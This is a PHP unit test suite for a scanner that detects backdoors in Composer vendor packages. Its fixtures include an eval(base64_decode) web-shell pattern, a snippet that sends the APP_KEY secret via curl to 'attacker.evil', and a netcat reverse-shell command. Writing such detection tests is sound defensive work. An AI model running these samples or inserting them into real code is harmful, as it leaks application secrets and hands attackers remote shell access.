<?php
/**
 * VendorBackdoorScanner Unit Tests
 * Part of Composer-Audit-ZeroTrust by Anton Barinov <https://github.com/Anton-Barinov>
 */

declare(strict_types=1);

require_once dirname(__DIR__) . '/src/Config/AuditConfig.php';
require_once dirname(__DIR__) . '/src/Scanner/VendorBackdoorScanner.php';

use ComposerZeroTrust\Config\AuditConfig;
use ComposerZeroTrust\Scanner\VendorBackdoorScanner;

echo "=== Running VendorBackdoorScanner Test Suite ===\n";

$pass = 0;
$fail = 0;

function assertBackdoor(string $name, bool $condition, string $detail = ''): void {
    global $pass, $fail;
    if ($condition) {
        echo "  [PASS] {$name}" . ($detail ? " -> {$detail}" : "") . "\n";
        $pass++;
    } else {
        echo "  [FAIL] {$name}" . ($detail ? " -> {$detail}" : "") . "\n";
        $fail++;
    }
}

$config = new AuditConfig();
$scanner = new VendorBackdoorScanner($config);

// 1. eval(base64_decode(...)) Obfuscation
$code1 = '<?php $cmd = eval(base64_decode("cGhwaW5mbygpOw==")); ?>';
$f1 = $scanner->analyzeFileContent('vendor/bad/package/index.php', $code1);
assertBackdoor(
    "Detects eval(base64_decode) web-shell pattern",
    count($f1) >= 1 && $f1[0]['type'] === 'EVAL_BASE64_OBFUSCATION',
    $f1 ? $f1[0]['detail'] : ''
);

// 2. Secret Snooping & Exfiltration (APP_KEY + curl_exec)
$code2 = '<?php 
$key = getenv("APP_KEY"); 
$ch = curl_init("https://attacker.evil/collect?k=" . urlencode($key));
curl_exec($ch);
?>';
$f2 = $scanner->analyzeFileContent('vendor/telemetry/tracker/src/Beacon.php', $code2);
assertBackdoor(
    "Detects APP_KEY theft & network exfiltration beacon",
    count($f2) >= 1 && $f2[0]['type'] === 'SECRET_EXFILTRATION_BEACON',
    $f2 ? $f2[0]['detail'] : ''
);

// 3. Interactive Reverse Shell
$code3 = '<?php system("nc -e /bin/sh 192.168.1.100 4444"); ?>';
$f3 = $scanner->analyzeFileContent('vendor/utility/runner/shell.php', $code3);
assertBackdoor(
    "Detects Netcat reverse shell invocation",
    count($f3) >= 1 && $f3[0]['type'] === 'NETCAT_REVERSESHELL',
    $f3 ? $f3[0]['detail'] : ''
);

// 4. Shannon Entropy on Packed Payload
// Random high-entropy base64 block
$highEntropy = base64_encode(random_bytes(150));
$code4 = "<?php \$packed = '{$highEntropy}'; ?>";
$entropyVal = $scanner->computeEntropy($highEntropy);
$f4 = $scanner->analyzeFileContent('vendor/packed/obf.php', $code4);
assertBackdoor(
    "Detects high Shannon entropy string blob (entropy: " . round($entropyVal, 2) . ")",
    count($f4) >= 1 && $f4[0]['type'] === 'SUSPICIOUS_HIGH_ENTROPY_BLOB',
    $f4 ? $f4[0]['snippet'] : ''
);

// 5. Clean Legitimate Code (Zero False Positives)
$code5 = '<?php
namespace App\Services;
class CleanService {
    public function formatPrice(float $amount, string $currency): string {
        return number_format($amount, 2) . " " . $currency;
    }
}';
$f5 = $scanner->analyzeFileContent('vendor/clean/lib/Service.php', $code5);
assertBackdoor(
    "Clean business logic produces zero false positives",
    count($f5) === 0
);

echo "Results: {$pass} Passed, {$fail} Failed\n\n";
if ($fail > 0) exit(1);
